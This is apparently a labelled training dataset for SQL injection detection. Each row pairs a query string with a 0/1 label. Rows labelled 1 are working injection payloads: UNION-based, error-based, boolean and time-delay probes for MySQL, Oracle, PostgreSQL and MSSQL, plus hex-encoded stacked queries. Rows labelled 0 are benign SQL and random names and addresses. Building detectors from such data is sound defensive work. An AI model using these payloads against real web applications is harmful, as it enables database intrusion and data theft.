Query,Label
1 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) # lexm,1
lima9za,0
65340567m,0
"SELECT DATE_SUB ( ""2017-06-15 09:34:21"", INTERVAL 3 HOUR ) ;",0
"-5193 where 2175 = 2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",1
"SELECT * FROM worth ORDER BY oxygen, follow",0
"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nelb' = 'nelb",1
SELECT fix FROM air UNION ALL SELECT national FROM pale ORDER BY cat,0
"1'|| ( select 'rask' from dual where 9411 = 9411 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",1
soubier.roudenko@mtos.is,0
SELECT * FROM ( SELECT fur FROM stared ),0
"SELECT travelID AS ID, summer AS thread FROM kept",0
DELETE FROM pole WHERE making = 'most',0
"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""xjdh"" = ""xjdh",1
SELECT * FROM wp_houzez_fields_builder order by id ASC,0
DELETE FROM recall WHERE lake = 'society',0
"1"" ) where 1705 = 1705",1
hi' ) or ( 'a' = 'a,1
or '1' = '1,1
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1
ca1t01i4oso,0
1' and 1 = ( select count ( * ) from tablenames ) ; --,1
SELECT * FROM kept WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM planning WHERE NOT chicken = 'minerals' AND NOT military = 'know',0
"admin"" or 1 = 1--",1
4.07378E+15,0
"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",1
"1 ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 5874 = 5874",1
"1 where 9072 = 9072 and elt ( 4249 = 4249,7259 ) --",1
ferris,0
10302390t,0
"-7347"" ) ) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
9124,0
declare @s varchar ( 200 ) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),1
chinaphan@viajesdacapalla.eh,0
"c/ virgen de la almudena, 61 12?c",0
or 1 in ( select @@version ) --,1
34116,0
"SELECT Orders.canalrID, Employees.pitch, Employees.slightly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.elseID ORDER BY Orders.promisedID",0
select case when 7649 = 9297 then 1 else null end--,1
"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'zjnp' = 'zjnp",1
"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",1
select ( case when ( 6047 = 8897 ) then 6047 else 6047* ( select 6047 from information_schema.character_sets ) end ) #,1
"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'hbld' = 'hbld",1
1 ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 8023 = 8023,1
1' and ( 3423 = 7789 ) *7789 and 'pdia' like 'pdia,1
SELECT fur FROM require UNION ALL SELECT gentle FROM weigh ORDER BY naturally,0
SELECT AVG ( against ) FROM note SELECT SUM ( deal ),0
"SELECT without AS settle, her AS [mile] FROM tip",0
SELECT * FROM good WHERE real IN ( SELECT simply FROM introduced ),0
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""kfps"" = ""kfps",1
"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
50491,0
salinillas de bureba,0
sandler,0
SELECT * FROM certain WHERE trouble = 'thou',0
"1 ) ) as faxr where 7972 = 7972 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
5.37091E+14,0
select ( case when ( 3444 = 8424 ) then 3444 else 3444* ( select 3444 from information_schema.character_sets ) end ) #,1
-8447 where 2850 = 2850 or 7147 = 3262,1
select ( case when ( 8716 = 1338 ) then 1 else 8716* ( select 8716 from master..sysdatabases ) end ) --,1
dax-branson@indianabilljaen.kp,0
6015,0
16417,0
"1'+ ( select 'asmj' where 7808 = 7808 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'",1
"SELECT * FROM anyway WHERE sheep IN ( 'gulf', 'silly', 'fill' )",0
SELECT * FROM ( SELECT theory FROM machinery ),0
"1'|| ( select 'gopc' where 7386 = 7386 and make_set ( 9375 = 7963,7963 ) ) ||'",1
"select * from generate_series ( 7667,7667,case when ( 7667 = 8232 ) then 1 else 0 end ) limit 1--",1
declare @s varchar ( 200 ) select @s = 0x77616974 ...,1
"SELECT * FROM mother WHERE information BETWEEN ""found"" AND ""water""",0
sigenza,0
"1' and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
4ntra6a,0
select ( case when ( 6287 = 8341 ) then 6287 else 1/ ( select 0 ) end ) --,1
quilolitr-o,0
husky_hurlic@ropadegolf.sn,0
SELECT AVG ( involved ) FROM so SELECT SUM ( deer ),0
"SELECT Orders.strongerrID, Employees.usual, Employees.tobacco FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.metID ORDER BY Orders.taskID",0
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",1
-3938%' ) ) ) or 2034 = 7209#,1
SELECT TOP 3 * FROM pull SELECT * FROM discover 3SELECT * FROM canal,0
"1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""kxws"" like ""kxws",1
SELECT equipment ( s ) FROM obtain LEFT JOIN,0
"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'nvsy' like 'nvsy",1
"1"" ) ) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT AVG ( similar ) FROM most,0
"1"" ) as wehx where 5744 = 5744",1
select sleep ( 5 ) and ( 'labj' = 'labj,1
fla,0
SELECT AVG ( inch ) FROM wood SELECT SUM ( silly ),0
rubau,0
"1 ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
nicforo,0
FROM ( SELECT DISTINCT down FROM far ),0
"SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.feltID ORDER BY Orders.totalID",0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 9481 = 9481",1
"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'qtfl' = 'qtfl",1
"select * from users where id = 1 + ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",1
"SELECT belong,alone,anybody FROM same LEFT JOIN Orders ON successful.progressID = return.weak ORDER BY tales.college",0
40315,0
cuarter8da,0
SELECT COUNT ( DISTINCT dried ) FROM put,0
"-7824"" ) ) ) union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",1
SELECT * FROM equally WHERE larger = 'has' AND City = 'broke',0
SELECT TOP 3 * FROM pony WHERE getting = 'life' SELECT * FROM ate,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 262329 ) ORDER BY meta_id ASC",0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""tbcc"" = ""tbcc",1
SELECT * FROM stopped WHERE of BETWEEN 'essential' AND 'raise',0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'xiyl' like 'xiyl",1
"-4408"" ) or 6872 = 6872 and ( ""oenu"" = ""oenu",1
SELECT * FROM smooth WHERE choose BETWEEN 'news' AND 'drop',0
1' where 3188 = 3188 and 9198 = 9198--,1
SELECT * FROM ( SELECT fuel FROM citizen ),0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 11514 ) ORDER BY meta_id ASC",0
"-7812' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'ttvo' = 'ttvo",1
mclawhor,0
"plaza aparejador federico bermudez 139,",0
7406,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 14594 ) ORDER BY meta_id ASC",0
SELECT * FROM people WHERE gray NOT LIKE '[obtain]%',0
apolilladura,0
1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'czqk' like 'czqk,1
"SELECT Orders.enjoyrID, Employees.organization, Employees.she FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.singleID ORDER BY Orders.awareID",0
-3921' ) as audo where 7087 = 7087 or 1755 = 4937--,1
SELECT flight ( s ) FROM means UNION ALL,0
"1' ) where 1600 = 1600 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1"" ) where 9115 = 9115",1
07947301l,0
5866,0
-9721' ) or 9287 = 4362#,1
"SELECT TIME_TO_SEC ( ""-03:30:00"" ) ;",0
despernada,0
10836981w,0
SELECT * FROM coal FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT copy ( s ) FROM fastened LEFT JOIN,0
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,1
SELECT * FROM made WHERE Price NOT BETWEEN 10 AND 20,0
SELECT AVG ( movie ) FROM modern,0
1'|| ( select 'dfmw' from dual where 1723 = 1723,1
"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
SELECT AVG ( shirt ) FROM cave,0
SELECT * FROM herd FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM supply,0
SELECT * FROM Customers WHERE Country = 'Germany' AND ( City = 'Berlin' OR City = 'München' ) ;,0
SELECT * FROM sat WHERE finest = 'satisfied' FETCH FIRST 3 ROWS ONLY,0
"calle diseminado hornos de rey 29, 7?b",0
"1%"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""%"" = """,1
4.8004E+14,0
SELECT * FROM major WHERE NOT consider = 'as',0
1 ) and 2006 = 2006,1
.lapidosa,0
SELECT * FROM molecular WHERE porch NOT LIKE 'local%',0
1' ) ) ) and 2006 = 2006,1
"-3733' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'ybgd' = 'ybgd",1
"SELECT * FROM magnet ORDER BY author, rush",0
"1%"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,1
"SELECT supper, finger, entireFROM slope WHERE here IS NOT NULL",0
SELECT TOP 3 * FROM plenty WHERE dawn = 'conversation',0
"1%"" union all select null,null,null,null,null,null,null--",1
59760678p,0
SELECT is FROM pleasant UNION SELECT careful FROM month ORDER BY rocky,0
lue39,0
SELECT DISTINCT sides FROM wire,0
' AND (SELECT COUNT(*) FROM pg_tables)>2 --,1
select ( case when ( 2161 = 4328 ) then 2161 else 2161* ( select 2161 from mysql.db ) end ) #,1
"admin' UNION SELECT NULL,NULL--",1
"SELECT * FROM positive ORDER BY human ASC, pleasure DESC",0
rodionova@movil-google.ga,0
SELECT COUNT ( add ) FROM pure,0
oktar,0
1is4r1o,0
"-3349 ) ) ) union all select 6553,6553#",1
SELECT * FROM clothing WHERE laugh BETWEEN '1996-07-01' AND '1996-07-31',0
1 ) where 2918 = 2918 and 7533 = 7533--,1
SELECT * FROM attention WHERE task BETWEEN 10 AND 20,0
"1"" ) as yphz where 8174 = 8174 union all select null,null,null,null,null,null,null--",1
SELECT * FROM interest WHERE NOT condition = 'section',0
1%' ) ) and 7160 = 7249--,1
"1'|| ( select 'lije' from dual where 5309 = 5309 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",1
-7072' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1
SELECT COUNT ( slipped ) FROM strike,0
-5089' ) ) as icbb where 1129 = 1129 or 6250 = 9650,1
65472744r,0
SELECT * FROM children WHERE pool NOT LIKE '[perhaps]%',0
declare @q nvarchar ( 4000 ) select @q =,1
SELECT length ( s ) FROM anyone INNER JOIN,0
"SELECT * FROM twice WHERE tropical BETWEEN ""bow"" AND ""dress""",0
select ( case when ( 6969 = 5797 ) then 6969 else 6969* ( select 6969 from information_schema.character_sets ) end ) #,1
l655a2uta,0
"1"" ) ) as tkmd where 3415 = 3415 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
39202408n,0
1' where 1844 = 1844,1
1'+ ( select 'lpkv' where 8760 = 8760,1
"-9698' ) ) as qnjv where 3360 = 3360 or make_set ( 9354 = 9354,7185 ) --",1
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""hxdd"" = ""hxdd",1
SELECT cream,0
SELECT TOP 50 PERCENT * FROM glass SELECT * FROM camp FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sleep,0
hwei-lin,0
8586,0
"1%"" ) ) ) and sleep ( 5 ) and ( ( ( ""%"" = """,1
"antigua de ancora s/n,",0
SELECT * FROM sick FETCH FIRST 3 ROWS ONLY,0
"SELECT enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold AS value FROM stick",0
"-7551 or elt ( 6900 = 7195,7195 )",1
c632i6ela,0
gelber serarols,0
-1886' where 5518 = 5518 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
"-5066' ) ) union all select 9689,9689,9689,9689#",1
"SELECT form, copy, sawFROM why WHERE fat IS NOT NULL",0
SELECT * FROM throughout WHERE history = 'seems' FETCH FIRST 3 ROWS ONLY,0
1'|| ( select 'kyhs' from dual where 9491 = 9491,1
1'|| ( select 'sliy' where 9494 = 9494,1
"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1
alvarez 35,0
segu san marful,0
SELECT easily ( s ) FROM earn UNION ALL,0
6r5int3805,0
SELECT AVG ( lead ) FROM figure SELECT SUM ( applied ),0
if ( 5127 = 2829 ) select 5127 else drop function okos--,1
SELECT * FROM earn WHERE strong = 'toward',0
1' where 9206 = 9206,1
"1%"" union all select null,null,null,null,null,null,null,null,null--",1
SELECT MIN ( pay ) AS unhappy FROM driving,0
gherardo,0
SELECT AVG ( Price ) FROM quiet,0
4.47874E+15,0
"1"" ) ) as ndbk where 5042 = 5042 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1
"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1
halford,0
"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'swfj' like 'swfj",1
SELECT egg FROM roof,0
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",1
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'eovg' like 'eovg",1
"SELECT Orders.automobilerID, Employees.pure, Employees.just FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.fastID ORDER BY Orders.richID",0
select pg_sleep ( 5 ) and ( 'itgc' = 'itgc,1
1 ) ) ) and 4595 = 4595#,1
1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1
"INSERT INTO individual ( triangle, yourself, officer ) VALUES ( 'mighty', 'curve', 'excited' )",0
1 where 8889 = 8889,1
"select * from users where id = 1 union select .1$_,version ( ) -- 1",1
"-6122"" ) union all select 6578,6578--",1
SELECT AVG ( dot ) FROM building SELECT SUM ( noted ),0
-4518 where 8023 = 8023 or 6872 = 6872--,1
27915,0
"INSERT INTO shade ( fire, contrast, mouse ) VALUES ( 'skill', 'sudden', 'dish' )",0
33120,0
select * from users where id = '1' <@$_ or 1 = 1 -- 1',1
-9509' ) ) ) or 1091 = 5477 and ( ( ( 'gsmz' = 'gsmz,1
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""seci"" = ""seci",1
"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lvck' = 'lvck",1
villanueva de huerva,0
SELECT job ( s ) FROM solar UNION ALL,0
"1'|| ( select 'nbmo' from dual where 5572 = 5572 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1'+ ( select 'jfir' where 7814 = 7814 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",1
"1"" where 3318 = 3318",1
"-2798'+ ( select 'emui' where 9565 = 9565 union all select 9565,9565,9565,9565--",1
"SELECT * FROM they ORDER BY ask ASC, mine DESC",0
SELECT DISTINCT bare FROM fun,0
50690,0
"-9119"" ) where 9237 = 9237 or 8571 = 8571--",1
15107,0
36lis8r,0
"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
escritor lopez de cardenas 76 12e,0
-7505' ) ) as lqvw where 8565 = 8565 or 6872 = 6872--,1
"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'skdm' = 'skdm",1
"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1
-8234' ) ) ) or 9323 = 9323#,1
1'|| ( select 'xlmt' where 1664 = 1664,1
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( '%' = '",1
-6244' ) as szpd where 8445 = 8445 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY,0
c4nt0rn,0
SELECT TOP 3 * FROM crop WHERE further = 'minerals' SELECT * FROM involved,0
SELECT well ( s ) FROM nothing LEFT JOIN,0
"1"" ) ) as puws where 7006 = 7006",1
5.58562E+15,0
"-4955%' union all select 5928,5928--",1
"-3902' ) ) ) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",1
"SELECT were,during,said FROM word LEFT JOIN Orders ON science.noneID = star.rich ORDER BY congress.part",0
"1"" and ( 7597 = 8422 ) *8422 and ""gywp"" like ""gywp",1
acedera,0
"1' where 8083 = 8083 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1
"1 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"-4513"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""gytb"" = ""gytb",1
"1' ) ) as hfra where 6500 = 6500 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1 ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
1 where 5443 = 5443,1
1 ) where 9708 = 9708,1
1' ) and 2006 = 2006,1
SELECT * FROM cut,0
princep muntadas,0
%2527%2520OR%25201%253D1%2520--,1
SELECT * FROM tall WHERE hung = brief,0
"-8841%"" ) or 4361 = 1910",1
8020,0
"SELECT earlier, few+ ', ' + hospital+ ' ' + direction+ ', ' + rich AS arrow FROM higher",0
SELECT * FROM ( SELECT degree FROM hand ),0
SELECT * FROM mostly WHERE thought = 'got' AND City = 'say',0
select case when 4176 = 6138 then 1 else null end--,1
"1%"" ) ) ) or sleep ( 5 ) and ( ( ( ""%"" = """,1
"-8521' ) union all select 2446,2446,2446,2446,2446,2446,2446#",1
"1'|| ( select 'kfyh' where 4737 = 4737 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ) ||'",1
